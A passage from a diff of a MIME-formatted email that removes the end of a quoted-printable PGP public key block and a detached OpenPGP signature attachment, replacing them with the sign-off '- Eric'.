-Eityff+LyqSkLGRYnwXZILGaSVPAdolOr/2IZVtUOzP7NlxZPzYRFUo1dvNmlrBc=0A=
-HpatY2YMoOGt/eD/jO2dm7RF6hK2BXCog0y5kdWvskOE0Jc8IBK55T2ss/xqCQ0V=0A=
-fElgATTFBxpj68INUya8Crn3hhv3XxHeKQ7CHJYvJmu5wZgIq31PDTZy3zbxmVSm=0A=
-YUQ3rTm7aOtYQKCEBH8WgH8YT8g+cJDrzIssMM5VDJ8KW7sanjwNQNnWR5qx6FRt=0A=
-g0Qf7Syk5oW+mId6haBAKZD2C1D4TVmSws1f5TzDuM3zydCgoichtF2wdcP5STnM=0A=
-baPJKZK05WT/0Mk3JDbE=0A=
-=3Dg3EM=0A=
------END PGP PUBLIC KEY BLOCK-----=0A=
-=0A=
-
---------------229FCECFECEEB653681F469B--
-
---aTtKoGnYkaaqoslNqdxH4q3F8At1YvwZl--
-
---gy4FoDM3yqwpS6htq5UnslzcyziEioeEY
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-
-iQIzBAEBCAAdFiEEL9Wp/yZWFD9OpIt6+7iGL1j3dbIFAlth9IIACgkQ+7iGL1j3
-dbIEkA/8CBD4DrrESuOOiw9hcHGxkcI7NX6MWkvdiPnughGZMkAMtZcv/PQ3XrJI
-OE3SB2U3Zt9Zz7XaVGhMONKqYg6Dpqt5VHy0Va3PxuSsO4+n1BMytyrnnbTz+zO/
-yF7GH7z5wfdXgLdkRENeri1ulUtB9LAy7UKJo8odrlnrwKg4KN4+OYg4naS4Oi2A
-exQs1/5Z4mXGIC7N2D1thPrWVafL5S3e8guJdxWgL7r30ShuwBlUFh7hE9sjxw8Y
-lIwEI4L01XfB6F8AE+HXfp17IX6+scDiwzGMX69IGA6JBGDo9Ppea/iHXXcYKVB/
-Ee5a8hSP7wP5oLGwyTGWBOVQ+X12pd2cFb4oQfYPUbtKRfe9wv3jsxNnK5Tc5KSy
-TD+jRxccqzdS+Bzci+rBp5jolLZ2ftdLC0MMGF7Rm/GvPhLI6StA0t5Z4d2AWAB6
-otcUua54bI7vFKcd7QaoU3DWQHUZUCk7PURUdQ4FD2vURQbMer+tph7l0IlTmJRk
-f2A74mPO5WZjwRIv+ifQjkS3CZIyLBgfFmVTpgo3Aa3vVYaWiTfjjRuMaIPdr6PC
-Nnl9bKgec1oKbyXdkhWHHNxazNUbmQBc48pqsoLHMaL9iySPxz23bvnnysghRGJL
-esqMkjQevA1QvEYjawt2Z8Uw9M+pCC2xv8lGs0kR27imV+ZpZ4c=
-=pLHk
------END PGP SIGNATURE-----
-
---gy4FoDM3yqwpS6htq5UnslzcyziEioeEY--
+- Eric
